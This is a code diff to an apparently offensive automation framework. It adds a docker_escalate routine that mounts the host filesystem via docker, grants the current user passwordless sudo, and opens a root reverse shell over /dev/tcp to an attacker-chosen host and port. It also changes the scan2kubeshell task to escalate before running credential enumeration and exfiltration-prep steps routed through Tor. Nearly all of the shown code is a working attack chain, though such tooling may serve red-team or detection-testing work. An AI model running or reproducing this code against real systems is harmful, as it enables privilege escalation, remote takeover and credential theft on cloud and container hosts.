@@ -226,6 +226,21 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     if session.platform.Path(file).exists():
                         session.platform.Path(file).unlink()
 
+            # adds current session user to sudoers
+            def docker_escalate(task, reverse_shell_host, reverse_shell_port):
+                payload = f"""
+while ! command -v docker; do "echo waiting for docker..."; sleep 30; done
+echo "current user: $(whoami)"
+docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash -c "echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" > /etc/sudoers.d/custom-sudoers"
+echo "new user: $(sudo whoami)"
+echo "starting escalated reverse shell..."
+nohup /bin/sh -c 'sudo /bin/bash -c "TASK={task} /bin/bash -i >& /dev/tcp/{reverse_shell_host}/{reverse_shell_port} 0>&1"' >/dev/null 2>&1 &
+"""
+                session.log("running docker escalate session...")
+                result = run_base64_payload(
+                    session=session, payload=payload, log_name="payload_dockerescalate")
+                session.log(result)
+
             def retry_command(command, max_attempts=5, sleep=10):
                 return f"""
 # Max number of attempts to start the Docker container
@@ -517,37 +532,47 @@ echo $BUCKET_URL
                 session.log("credentialed_access_tor complete")
             elif task_name == "scan2kubeshell":
                 csp = "aws"
-                enum_exfil_prep_creds(csp, "iam2enum")
-                session.log("running iam2enum enumeration...")
-                credentialed_access_tor(
-                    csp=csp,
-                    jobname="iam2enum",
-                    cwd=f'/iam2enum',
-                    script=f'iam2enum.sh',
-                    args="--profile=default"
-                )
-                session.log("iam2enum enumeration complete")
+                current_user = session.platform.getenv('USER')
+                session.log(f"current user: {current_user}")
+                if current_user != "root":
+                    session.log(
+                        f"current is not root escalating privleges and reconnecting...")
+                    docker_escalate(task_name, reverse_shell_host,
+                                    reverse_shell_port)
+                    session.log(f"session escalation call complete.")
+                else:
+                    enum_exfil_prep_creds(csp, "iam2enum")
+                    session.log("running iam2enum enumeration...")
+                    credentialed_access_tor(
+                        csp=csp,
+                        jobname="iam2enum",
+                        cwd=f'/iam2enum',
+                        script=f'iam2enum.sh',
+                        args="--profile=default"
+                    )
+                    session.log("iam2enum enumeration complete")
 
-                tmp_dir = Path("/tmp")
-                # create work directory
-                task_path = Path(f"/{task_name}")
-                if task_path.exists() and task_path.is_dir():
-                    shutil.rmtree(task_path)
-                task_path.mkdir(parents=True)
+                    tmp_dir = Path("/tmp")
+                    # create work directory
+                    task_path = Path(f"/{task_name}")
+                    if task_path.exists() and task_path.is_dir():
+                        shutil.rmtree(task_path)
+                    task_path.mkdir(parents=True)
 
-                # copy our payload to the local working directory
-                task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
-                shutil.copy2(task_script, task_path)
-                session.log(
-                    "running scan2kubeshell credentialed_access_tor...")
-                credentialed_access_tor(
-                    csp=csp,
-                    jobname=task_name,
-                    cwd=f'/{task_name}',
-                    script=f'{task_name}.sh',
-                    args=f'--reverse-shell-host={reverse_shell_host} --reverse-shell-port={reverse_shell_port}'
-                )
-                session.log("credentialed_access_tor complete")
+                    # copy our payload to the local working directory
+                    task_script = Path(
+                        f"{script_dir}/../resources/{task_name}.sh")
+                    shutil.copy2(task_script, task_path)
+                    session.log(
+                        "running scan2kubeshell credentialed_access_tor...")
+                    credentialed_access_tor(
+                        csp=csp,
+                        jobname=task_name,
+                        cwd=f'/{task_name}',
+                        script=f'{task_name}.sh',
+                        args=f'--reverse-shell-host={reverse_shell_host} --reverse-shell-port={reverse_shell_port}'
+                    )
+                    session.log("credentialed_access_tor complete")
             elif task_name == "kube2s3":
                 csp = "aws"
                 # context here is we're inside pod that has access to s3
